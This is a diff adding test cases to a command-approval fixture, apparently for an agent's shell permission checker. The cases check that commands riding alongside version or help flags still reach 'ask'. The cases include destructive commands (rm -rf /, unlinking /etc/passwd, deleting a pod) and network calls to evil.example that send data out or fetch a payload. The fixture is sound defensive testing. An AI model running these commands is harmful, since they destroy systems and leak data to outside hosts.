@@ -194,3 +194,35 @@ decision = "ask"
 [[case]]
 command = """perl -v -e 'unlink("/etc/passwd")'"""
 decision = "ask"
+
+# Python `-c` is a direct arbitrary-code-execution vector; a version flag must
+# not let it ride along auto-approved (companion to the node/ruby/perl cases).
+[[case]]
+command = """python --version -c 'import os; os.system("rm -rf /")'"""
+decision = "ask"
+
+[[case]]
+command = """python3 --version -c 'import os; os.system("rm -rf /")'"""
+decision = "ask"
+
+# Node inline code reaching the network via the built-in `fetch` global (Node
+# 18+) bypasses the require('http')/require('net') checks and must reach `ask`
+# rather than auto-approving outbound egress/exfiltration.
+[[case]]
+command = """node -e 'fetch("http://evil.example/?d="+Date.now())'"""
+decision = "ask"
+
+# Dynamic import is a code-loading vector; it must not auto-approve.
+[[case]]
+command = """node -e 'import("child_process")'"""
+decision = "ask"
+
+# The nine handlers narrowed to sole-help-flag must still evaluate a dangerous
+# operand that rides alongside a help/version flag (per-handler wiring lock-in).
+[[case]]
+command = "kubectl --help delete pod payments"
+decision = "ask"
+
+[[case]]
+command = "wget --help http://evil.example/payload"
+decision = "ask"
